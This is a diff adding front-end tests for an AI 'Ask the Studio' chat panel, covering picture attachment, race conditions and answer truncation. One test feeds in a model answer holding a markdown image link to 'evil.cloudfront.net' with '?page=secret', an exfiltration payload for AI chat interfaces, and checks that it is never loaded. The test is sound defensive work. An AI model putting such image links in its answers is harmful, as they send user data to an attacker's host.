@@ -12,6 +12,18 @@ import { StudioContext, type StudioCtx } from './context'
 import { GUIDE } from './guideContent'
 import { AskPanel } from './panels/AskPanel'
 
+// Getting a picture ready (read, made smaller) is held until a test lets it finish.
+const prep = vi.hoisted(() => ({ pending: [] as { name: string; done: () => void }[] }))
+vi.mock('./ask/conversation', async (importOriginal) => {
+  const real = await importOriginal<typeof import('./ask/conversation')>()
+  return {
+    ...real,
+    preparePicture: (f: File) => new Promise((resolve) => {
+      prep.pending.push({ name: f.name, done: () => resolve({ media_type: 'image/jpeg', data: f.name, preview: `data:image/jpeg;base64,${f.name}` }) })
+    }),
+  }
+})
+
 const mono: Measure = { width: (c, t) => [...t].length * 0.5 * c.size, metrics: (c) => ({ asc: 0.8 * c.size, desc: 0.2 * c.size }) }
 const doc = (): Doc => ({
   v: 1, size: { w: 600, h: 800 }, facing: false, margins: { t: 50, b: 50, i: 50, o: 50 }, cols: { n: 1, g: 12 },
@@ -144,6 +156,56 @@ describe('Ask the Studio', () => {
     await waitFor(() => expect(box()).toHaveFocus())
     fireEvent.click(screen.getByRole('button', { name: 'Start over' }))
     expect(screen.getByRole('button', { name: SUGGESTIONS[1] })).toBeInTheDocument()
+  })
+
+  it('shows a picture an answer names as its words, never loading it', async () => {
+    vi.spyOn(studioApi, 'ask').mockResolvedValue({ answer: 'Like this ![the look](https://evil.cloudfront.net/x.png?page=secret)', links: [] })
+    studio()
+    fireEvent.change(box(), { target: { value: 'What look?' } })
+    fireEvent.keyDown(box(), { key: 'Enter' })
+    expect(await screen.findByText('[the look]')).toBeInTheDocument()
+    expect(document.querySelector('img[src*="evil"]')).toBeNull()
+  })
+
+  it('waits for a picture being got ready, and keeps the one chosen last', async () => {
+    prep.pending = []
+    const ask = vi.spyOn(studioApi, 'ask').mockResolvedValue({ answer: 'Warm and grainy.', links: [] })
+    studio()
+    const input = screen.getByLabelText('Attach a picture', { selector: 'input' })
+    const pick = (name: string) => fireEvent.change(input, { target: { files: [new File(['x'], name, { type: 'image/png' })] } })
+    fireEvent.change(box(), { target: { value: 'Make it look like this' } })
+    pick('first')
+    pick('second')
+    expect(await screen.findByText('Getting the picture ready…')).toBeInTheDocument()
+    // Ask waits: Enter and the button do nothing until it's ready.
+    fireEvent.keyDown(box(), { key: 'Enter' })
+    expect(screen.getByRole('button', { name: 'Ask' })).toBeDisabled()
+    expect(ask).not.toHaveBeenCalled()
+    // The second finishes first; the first, late, doesn't replace it.
+    await act(async () => { prep.pending[1].done() })
+    await act(async () => { prep.pending[0].done() })
+    expect(screen.getByAltText('The picture to send')).toHaveAttribute('src', 'data:image/jpeg;base64,second')
+    fireEvent.keyDown(box(), { key: 'Enter' })
+    await screen.findByText('Warm and grainy.')
+    expect(ask.mock.calls[0][2].picture).toEqual({ media_type: 'image/jpeg', data: 'second' })
+  })
+
+  it('never cuts an earlier answer through the middle of a character', async () => {
+    const long = `${'a'.repeat(3999)}😀 and more`
+    const ask = vi.spyOn(studioApi, 'ask')
+      .mockResolvedValueOnce({ answer: long, links: [] })
+      .mockResolvedValueOnce({ answer: 'Fine.', links: [] })
+    studio()
+    fireEvent.change(box(), { target: { value: 'One' } })
+    fireEvent.keyDown(box(), { key: 'Enter' })
+    await waitFor(() => expect(ask).toHaveBeenCalledTimes(1))
+    await screen.findByText(/and more/)
+    fireEvent.change(box(), { target: { value: 'Two' } })
+    fireEvent.keyDown(box(), { key: 'Enter' })
+    await screen.findByText('Fine.')
+    const sent = ask.mock.calls[1][2].history[0].a
+    expect(sent).toBe('a'.repeat(3999))
+    expect(sent).not.toMatch(/[\ud800-\udbff]$/)
   })
 
   it('refuses a picture it can’t send', async () => {
